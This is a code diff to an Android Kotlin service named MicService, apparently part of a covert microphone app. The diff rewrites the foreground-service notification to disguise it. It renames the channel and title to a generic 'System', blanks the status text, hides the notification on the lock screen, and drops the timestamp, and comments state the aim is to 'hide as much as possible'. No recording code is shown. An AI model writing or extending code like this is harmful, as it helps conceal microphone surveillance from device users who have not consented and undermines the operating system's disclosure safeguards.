@@ -2532,14 +2532,14 @@ class MicService : Service() {
     // ────────────────────────────────────────────────────────────────────────
 
     private fun createNotificationChannel() {
-        // IMPORTANCE_MIN makes notification invisible but still allows foreground service
-        // Device Owner doesn't need visible notification for survival
+        // IMPORTANCE_LOW is required for foreground service survival
+        // But we hide as much as possible
         val channel = NotificationChannel(
             CHANNEL_ID,
-            "Device Services",
-            NotificationManager.IMPORTANCE_MIN  // Changed from LOW to MIN (invisible)
+            "System",  // Generic name
+            NotificationManager.IMPORTANCE_LOW  // Required for foreground service
         ).apply {
-            description = "System services"
+            description = "Background service"
             setSound(null, null)
             enableVibration(false)
             setShowBadge(false)
@@ -2552,21 +2552,23 @@ class MicService : Service() {
 
     private fun buildNotification(statusText: String): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Device Services")
-            .setContentText(statusText)
-            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)  // subtle icon
-            .setPriority(NotificationCompat.PRIORITY_MIN)  // Changed from LOW to MIN
+            .setContentTitle("System")  // Generic title
+            .setContentText("")  // Empty text - less visible
+            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
             .setOngoing(true)
             .setSilent(true)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // hidden on lock screen
-            .setShowWhen(false)  // Hide timestamp
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setShowWhen(false)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
+            .setLocalOnly(true)  // Don't sync to other devices
             .build()
     }
 
     private fun updateNotification(statusText: String) {
+        // Ignore status text - always show minimal notification
         val manager = getSystemService(NotificationManager::class.java)
-        manager.notify(NOTIF_ID, buildNotification(statusText))
+        manager.notify(NOTIF_ID, buildNotification(""))
     }
 
     // ────────────────────────────────────────────────────────────────────────
